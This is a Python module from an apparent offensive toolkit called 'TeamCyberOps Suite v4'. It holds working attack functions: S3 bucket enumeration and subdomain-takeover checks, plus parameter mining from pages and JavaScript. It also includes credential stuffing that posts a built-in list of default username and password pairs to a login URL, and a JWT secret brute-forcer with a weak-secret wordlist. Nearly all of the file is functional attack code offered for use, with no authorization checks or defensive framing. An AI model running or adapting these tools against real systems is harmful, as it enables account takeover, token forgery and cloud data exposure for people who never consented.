"""
TeamCyberOps Suite v4 — Advanced Recon Tools
S3 Bucket Finder · Subdomain Takeover · Parameter Mining · Credential Stuffing · JWT Wordlist
"""
import urllib.request, urllib.parse, json, re, threading, time, socket, os
from pathlib import Path

BASE_DIR = Path(__file__).parent.parent.parent
LOGS_DIR = BASE_DIR / "logs"
WL_DIR   = BASE_DIR / "wordlists"

# ── S3 BUCKET FINDER ────────────────────────────────────────────
S3_PERMUTATIONS = [
    "{name}", "{name}-backup", "{name}-dev", "{name}-staging", "{name}-prod",
    "{name}-assets", "{name}-static", "{name}-data", "{name}-uploads",
    "{name}-files", "{name}-media", "{name}-logs", "{name}-config",
    "{name}backup", "{name}dev", "{name}prod", "{name}assets",
    "backup-{name}", "dev-{name}", "staging-{name}", "prod-{name}",
]
S3_REGIONS = ["us-east-1","us-west-2","eu-west-1","ap-southeast-1","ap-northeast-1"]

def find_s3_buckets(company_name, log_cb=None):
    log = log_cb or (lambda m,t='': None)
    found = []
    log(f"[*] S3 Bucket scan for: {company_name}", "info")
    name = company_name.lower().replace(" ","-").replace(".","-")
    buckets = [p.replace("{name}",name) for p in S3_PERMUTATIONS]
    
    def _check(bucket):
        urls = [
            f"https://{bucket}.s3.amazonaws.com/",
            f"https://s3.amazonaws.com/{bucket}/",
            f"https://{bucket}.s3-website.us-east-1.amazonaws.com/",
        ]
        for url in urls:
            try:
                req = urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0"})
                r = urllib.request.urlopen(req, timeout=6)
                body = r.read(1000).decode("utf-8","replace")
                status = r.status
                if status == 200:
                    public = "<ListBucket" in body or "Contents" in body
                    found.append({"bucket":bucket,"url":url,"status":status,"public":public})
                    log(f"[!] FOUND: {bucket} ({'PUBLIC' if public else 'exists'})", "ok")
                    return
            except urllib.error.HTTPError as e:
                if e.code == 403:
                    found.append({"bucket":bucket,"url":url,"status":403,"public":False,"exists":True})
                    log(f"[+] EXISTS (private): {bucket}", "warn")
                    return
            except Exception: pass
    
    threads = [threading.Thread(target=_check, args=(b,), daemon=True) for b in buckets]
    for t in threads: t.start()
    for t in threads: t.join()
    
    log(f"[✓] S3 scan done: {len(found)} buckets found", "ok" if found else "dim")
    return {"company":company_name,"buckets":found,"total":len(found)}


# ── SUBDOMAIN TAKEOVER CHECKER ───────────────────────────────────
TAKEOVER_SIGNATURES = {
    "GitHub Pages":       ["There isn't a GitHub Pages site here","For root URLs"],
    "Heroku":             ["No such app","heroku | no-such-app"],
    "Shopify":            ["Sorry, this shop is currently unavailable"],
    "Fastly":             ["Fastly error: unknown domain"],
    "Ghost":              ["The thing you were looking for is no longer here"],
    "Surge.sh":           ["project not found"],
    "Readme.io":          ["Project doesnt exist... yet!"],
    "Tilda":              ["Please renew your subscription"],
    "Unbounce":           ["The requested URL was not found"],
    "Pantheon":           ["The gods are wise"],
    "Zendesk":            ["Help Center Closed"],
    "HubSpot":            ["Domain not found"],
    "Azure":              ["ErrorCode: DomainNotFound","404 Web Site not found"],
    "AWS S3":             ["NoSuchBucket","The specified bucket does not exist"],
    "Cargo":              ["If you're moving your domain away from Cargo"],
    "Bitbucket":          ["Repository not found"],
    "Squarespace":        ["No Such Account"],
    "Tumblr":             ["Whatever you were looking for doesn't live here"],
    "WP Engine":          ["The site you were looking for couldn't be found"],
}

def check_subdomain_takeover(subdomains, log_cb=None):
    log = log_cb or (lambda m,t='': None)
    vulnerable = []
    log(f"[*] Checking {len(subdomains)} subdomains for takeover...", "info")
    
    def _check(subdomain):
        subdomain = subdomain.strip()
        if not subdomain: return
        # Check CNAME first
        try:
            import subprocess
            r = subprocess.run(["host",subdomain], capture_output=True, text=True, timeout=5)
            cname = ""
            for line in r.stdout.splitlines():
                if "alias" in line.lower():
                    cname = line.split()[-1]
                    break
        except Exception:
            cname = ""
        
        for url in [f"https://{subdomain}", f"http://{subdomain}"]:
            try:
                req = urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=8) as resp:
                    body = resp.read(2000).decode("utf-8","replace")
                for service, sigs in TAKEOVER_SIGNATURES.items():
                    for sig in sigs:
                        if sig.lower() in body.lower():
                            vulnerable.append({
                                "subdomain":subdomain, "service":service,
                                "signature":sig, "cname":cname, "url":url
                            })
                            log(f"[!] TAKEOVER: {subdomain} → {service}", "ok")
                            return
            except urllib.error.HTTPError as e:
                body = e.read(500).decode("utf-8","replace")
                for service, sigs in TAKEOVER_SIGNATURES.items():
                    for sig in sigs:
                        if sig.lower() in body.lower():
                            vulnerable.append({
                                "subdomain":subdomain,"service":service,
                                "signature":sig,"status":e.code,"cname":cname
                            })
                            log(f"[!] TAKEOVER ({e.code}): {subdomain} → {service}", "ok")
                            return
            except Exception as ex:
                # NXDOMAIN = potential takeover!
                if "NXDOMAIN" in str(ex) or "Name or service" in str(ex):
                    if cname:
                        vulnerable.append({
                            "subdomain":subdomain,"type":"NXDOMAIN","cname":cname
                        })
                        log(f"[?] NXDOMAIN + CNAME: {subdomain} → {cname}", "warn")
                break
    
    threads = [threading.Thread(target=_check, args=(s,), daemon=True) for s in subdomains[:100]]
    for t in threads: t.start()
    for t in threads: t.join()
    
    log(f"[✓] Takeover scan done: {len(vulnerable)} vulnerable", "ok" if vulnerable else "dim")
    return {"checked":len(subdomains),"vulnerable":vulnerable,"count":len(vulnerable)}


# ── PARAMETER MINING ────────────────────────────────────────────
def mine_parameters(target_url, js_content="", wayback_urls=None, log_cb=None):
    log = log_cb or (lambda m,t='': None)
    params = set()
    log(f"[*] Parameter mining: {target_url}", "info")
    
    # From URL itself
    try:
        parsed = urllib.parse.urlparse(target_url)
        for k in urllib.parse.parse_qs(parsed.query):
            params.add(k)
    except Exception: pass
    
    # From JS content
    if js_content:
        patterns = [
            r'["\']([a-zA-Z_][a-zA-Z0-9_]{1,30})["\']:\s*["\']',
            r'params\.["\']?([a-zA-Z_][a-zA-Z0-9_]{1,30})',
            r'data\[["\'`]([a-zA-Z_][a-zA-Z0-9_]{1,30})["\'`]\]',
            r'(?:get|post|put|delete)\s*\(\s*["\'][^"\']*\?([^"\'&\s]+)',
            r'[?&]([a-zA-Z_][a-zA-Z0-9_]{1,30})=',
        ]
        for pat in patterns:
            params.update(re.findall(pat, js_content, re.IGNORECASE))
    
    # From Wayback URLs
    if wayback_urls:
        for url in wayback_urls:
            try:
                parsed = urllib.parse.urlparse(url)
                for k in urllib.parse.parse_qs(parsed.query):
                    params.add(k)
            except Exception: pass
    
    # Fetch target and extract from HTML
    try:
        req = urllib.request.Request(target_url, headers={"User-Agent":"Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=10) as r:
            body = r.read(5000).decode("utf-8","replace")
        # form inputs
        params.update(re.findall(r'<input[^>]+name=["\']([^"\']+)["\']', body, re.I))
        # JS vars
        params.update(re.findall(r'[?&]([a-zA-Z_][a-zA-Z0-9_]{1,20})=', body))
    except Exception: pass
    
    # Categorize
    interesting = {"id","user","admin","token","key","pass","secret","auth","file",
                   "path","url","redirect","return","callback","action","cmd","exec"}
    categorized = {
        "interesting": [p for p in params if any(k in p.lower() for k in interesting)],
        "all": sorted(params),
    }
    log(f"[✓] Found {len(params)} parameters ({len(categorized['interesting'])} interesting)", 
        "ok" if params else "dim")
    for p in categorized["interesting"]:
        log(f"  [!] Interesting param: {p}", "warn")
    return categorized


# ── CREDENTIAL STUFFING ──────────────────────────────────────────
DEFAULT_CREDS = [
    ("admin","admin"),("admin","password"),("admin","123456"),("admin","admin123"),
    ("root","root"),("root","toor"),("root","password"),("root","123456"),
    ("administrator","administrator"),("administrator","password"),
    ("user","user"),("user","password"),("user","123456"),
    ("test","test"),("test","password"),("guest","guest"),("guest","password"),
    ("admin",""),("root",""),("admin","admin1234"),("admin","P@ssw0rd"),
    ("admin","letmein"),("admin","changeme"),("admin","qwerty"),("admin","12345678"),
]

def credential_stuff(login_url, username_field="username", password_field="password",
                     success_indicator="dashboard", custom_creds=None, 
                     delay=0.5, log_cb=None):
    log = log_cb or (lambda m,t='': None)
    results = []
    creds = custom_creds or DEFAULT_CREDS
    log(f"[*] Credential stuffing: {login_url}", "info")
    log(f"[*] Testing {len(creds)} credential pairs", "dim")
    
    for i, (user, passwd) in enumerate(creds):
        try:
            payload = {username_field: user, password_field: passwd}
            req = urllib.request.Request(
                login_url,
                data=json.dumps(payload).encode(),
                headers={"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
                method="POST")
            with urllib.request.urlopen(req, timeout=8) as r:
                body = r.read(2000).decode("utf-8","replace")
                if success_indicator.lower() in body.lower():
                    results.append({"username":user,"password":passwd,"status":r.status})
                    log(f"[!] VALID: {user}:{passwd}", "ok")
        except urllib.error.HTTPError as e:
            if e.code in (200, 302):
                body = e.read(500).decode("utf-8","replace")
                if success_indicator.lower() in body.lower():
                    results.append({"username":user,"password":passwd,"status":e.code})
                    log(f"[!] VALID (redirect): {user}:{passwd}", "ok")
        except Exception: pass
        
        if i % 5 == 0:
            log(f"  [{i+1}/{len(creds)}] Testing...", "dim")
        time.sleep(delay)
    
    log(f"[✓] Done: {len(results)} valid credentials found", "ok" if results else "dim")
    return {"url":login_url,"valid":results,"tested":len(creds)}


# ── JWT SECRET WORDLIST ──────────────────────────────────────────
JWT_SECRETS = [
    "secret","password","123456","admin","key","jwt","token","secret_key",
    "jwttoken","jwt_secret","your-secret-key","your-256-bit-secret",
    "supersecretkey","mysecretkey","secretkey","change_this","changeme",
    "private","private_key","app_secret","flask_secret","django-insecure",
    "dev_secret","test_secret","prod_secret","local_secret","api_secret",
    "hmac_secret","signing_key","auth_secret","access_secret","refresh_secret",
    "S3cr3t","P@ssw0rd","passw0rd","pa$$word","letmein","welcome1",
    "qwerty","12345678","password123","admin123","root123","test123",
    "HS256","HS384","HS512","RS256","none","null","undefined","",
    "your_jwt_secret_key","jwt-secret","jwt.secret","jwt_key","jwt-key",
    "1234567890","abcdefghij","aaaaaaaaaa","0000000000","9999999999",
    "my-secret","my_secret","the_secret","a_secret","secret123",
    "super-secret","super_secret","supersecret","SuperSecret","SUPER_SECRET",
    "app-secret","app_secret_key","APPLICATION_SECRET","SECRET_KEY",
    "auth-secret","AUTH_SECRET","TOKEN_SECRET","JWT_SECRET_KEY",
]

def brute_jwt_secret(token, extra_wordlist=None, log_cb=None):
    log = log_cb or (lambda m,t='': None)
    log(f"[*] JWT brute-force: {token[:30]}...", "info")
    
    wordlist = list(JWT_SECRETS)
    if extra_wordlist:
        wordlist.extend(extra_wordlist)
    
    # Also try from project wordlists
    wl_file = WL_DIR / "passwords.txt"
    if wl_file.exists():
        try:
            wordlist.extend(wl_file.read_text().splitlines())
        except Exception: pass
    
    wordlist = list(dict.fromkeys(wordlist))  # deduplicate
    log(f"[*] Testing {len(wordlist)} secrets", "dim")
    
    # Parse JWT
    try:
        parts = token.split(".")
        if len(parts) != 3:
            log("[-] Not a valid JWT format", "err"); return {"error":"Invalid JWT"}
        header_b64 = parts[0] + "=" * (-len(parts[0]) % 4)
        import base64
        header = json.loads(base64.urlsafe_b64decode(header_b64))
        alg = header.get("alg","HS256")
    except Exception as e:
        log(f"[-] JWT parse error: {e}", "err"); return {"error":str(e)}
    
    if alg not in ("HS256","HS384","HS512"):
        log(f"[-] Algorithm {alg} cannot be brute-forced (not HMAC)", "warn")
        return {"error":f"Algorithm {alg} not brute-forceable"}
    
    import hmac, hashlib, base64
    alg_map = {"HS256":hashlib.sha256,"HS384":hashlib.sha384,"HS512":hashlib.sha512}
    hash_fn = alg_map.get(alg, hashlib.sha256)
    
    header_payload = f"{parts[0]}.{parts[1]}"
    try:
        sig = base64.urlsafe_b64decode(parts[2] + "=" * (-len(parts[2]) % 4))
    except Exception as e:
        return {"error":f"Signature decode: {e}"}
    
    found = None
    for i, secret in enumerate(wordlist):
        test_sig = hmac.new(secret.encode(), header_payload.encode(), hash_fn).digest()
        if test_sig == sig:
            found = secret
            log(f"[!] JWT SECRET FOUND: {secret!r}", "ok")
            break
        if i % 500 == 0 and i > 0:
            log(f"  [{i}/{len(wordlist)}] Still searching...", "dim")
    
    if not found:
        log(f"[-] Secret not found in {len(wordlist)} attempts", "dim")
    
    return {"found":found,"tested":len(wordlist),"algorithm":alg}
